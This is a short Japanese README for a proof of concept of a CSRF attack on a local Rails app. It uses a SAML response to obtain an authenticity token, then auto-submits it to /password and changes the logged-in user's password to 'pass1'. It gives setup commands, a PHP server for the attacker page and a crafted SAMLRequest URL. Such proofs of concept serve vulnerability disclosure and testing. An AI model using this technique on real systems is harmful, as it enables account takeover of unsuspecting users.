# CSRF PoC

SAML のレスポンス経由で `authenticity_token` を受け取り、`/password` に自動送信してパスワードを `pass1` に変更する PoC です。

## Setup

```bash
bin/setup
bin/rails server
```

別ターミナル:

```bash
cd poc
php -S 0.0.0.0:4000
```

## Steps

1. `http://localhost:3000/login` でログインする
2. 次の URL を開く

```text
http://localhost:3000/saml/auth?SAMLRequest=fZLdT4MwFMXf91cQ3hnlQ8iaQYJbjEumkg198MV05eJISou9xY%2F%2FXsZc1IStj%2B25v3PuSefIGtHSrDN7uYG3DtBYn42QSIeHxO60pIphjVSyBpAaTrfZ3Zr6U0JbrYziStgTa%2BT8Yi5TGCJoUys5jlktE%2FsFYjarZrOARH7A%2BIxcVbsoJjEPw8jzgiqseMQY%2BHwc8QQae35i93ZnTBA7WEk0TJpeRvzIIYHjxwWJqR%2FSMHwen8tO2RdKYteA3oJ%2Brzk8btaJvTempa4rFGdir9DQkBDiHgpx%2BVE%2BDs1%2Far2uZVnL18vt7Y4ipLdFkTv5w7aw0546P9jQYS2dXgjSgGElM2zu%2Fh04AVp63xuulrkSNf%2BybpRumDmfx5t6w01dOtUgpdCwWmRlqQFxfNm%2BQyHUx0IDM5DYRndgW246OQb6%2FzPTyTc%3D
```

3. 変更後のパスワード `pass1` でログインできれば成功
